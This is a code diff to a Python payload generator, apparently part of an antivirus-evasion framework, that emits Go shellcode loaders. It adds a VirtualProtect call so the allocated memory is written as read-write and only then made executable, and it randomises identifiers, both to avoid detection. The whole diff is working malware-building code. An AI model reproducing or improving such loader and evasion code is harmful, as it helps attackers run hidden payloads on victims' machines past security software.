@@ -65,8 +65,9 @@ class PayloadModule:
         heapcreateout = evasion_helpers.randomString()
         errorvariable = evasion_helpers.randomString()
         heapallocout = evasion_helpers.randomString()
-        errorvariabledos = evasion_helpers.randomString()
         rand_var = evasion_helpers.randomString()
+        procVirtualProtect = evasion_helpers.randomString()
+        proc_out = evasion_helpers.randomString()
 
         # Generate the shellcode
         if not self.cli_shellcode:
@@ -105,14 +106,16 @@ class PayloadModule:
             payload_code += "const (\n"
             payload_code += "%s  = 0x1000\n" % (memCommit)
             payload_code += "%s = 0x2000\n" % (memReserve)
-            payload_code += "%s  = 0x40\n)\n" % (pageExecRW)
+            payload_code += "%s  = 0x04\n)\n" % (pageExecRW)
 
         payload_code += "var (\n"
 
         # injection type
         if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
+            payload_code += "%s = 0\n" %(proc_out)
             payload_code += "%s = syscall.NewLazyDLL(\"kernel32.dll\")\n" %(kernel32)
-            payload_code += "%s = %s.NewProc(\"VirtualAlloc\")\n)\n" %(procVirtualAlloc, kernel32)
+            payload_code += "%s = %s.NewProc(\"VirtualAlloc\")\n" %(procVirtualAlloc, kernel32)
+            payload_code += "%s = %s.NewProc(\"VirtualProtect\")\n)\n" %(procVirtualProtect, kernel32)
             payload_code += "func %s(%s uintptr) (uintptr, error) {\n" %(cust_func, size)
             payload_code += "%s, _, %s := %s.Call(0, %s, %s|%s, %s)\n" %(addr, err, procVirtualAlloc, size, memReserve, memCommit, pageExecRW)
             payload_code += "if %s == 0 {\nreturn 0, %s\n}\nreturn %s, nil\n}\n" %(addr, err, addr)
@@ -140,6 +143,9 @@ class PayloadModule:
         payload_code += "if %s != nil {\nfmt.Println(%s)\nos.Exit(1)\n}\n" %(err, err)
         if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
             payload_code += "%s := (*[890000]byte)(unsafe.Pointer(%s))\n" %(buff, addr)
+            payload_code += "var %s uintptr\n" %(proc_out)
+            payload_code += "%s, _, %s = %s.Call(%s, uintptr(len(%s)), 0x20, 0)\n" %(proc_out, err, procVirtualProtect, addr, shellcode_variable)
+            payload_code += "if %s == 0 {\nos.Exit(1)\n}\n" %(proc_out)
         elif self.required_options["INJECT_METHOD"][0].lower() == "heap":
             payload_code += "%s := (*[890000]byte)(unsafe.Pointer(%s))\n" %(buff, heapallocout)
         payload_code += "for " + rand_var + ", %s := range []byte(%s) {\n" %(value, shellcode_variable)
